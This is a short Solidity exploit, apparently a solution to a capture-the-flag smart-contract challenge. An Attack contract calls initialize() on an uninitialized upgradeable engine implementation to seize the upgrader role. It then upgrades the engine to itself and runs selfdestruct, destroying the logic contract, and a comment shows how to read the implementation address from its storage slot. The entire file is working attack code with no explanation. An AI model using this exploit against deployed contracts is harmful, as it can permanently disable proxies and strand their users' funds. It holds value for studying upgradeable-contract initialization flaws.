pragma solidity ^0.8;

interface IEngine {
    function upgrader() external view returns (address);

    function initialize() external;

    function upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) external payable;
}

// await web3.eth.getStorageAt(contract.address , "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")
contract Attack {
    function attack(IEngine target) external {
        target.initialize();
        target.upgradeToAndCall(
            address(this),
            abi.encodeWithSelector(this.kill.selector)
        );
    }

    function kill() external {
        selfdestruct(payable(address(0)));
    }
}
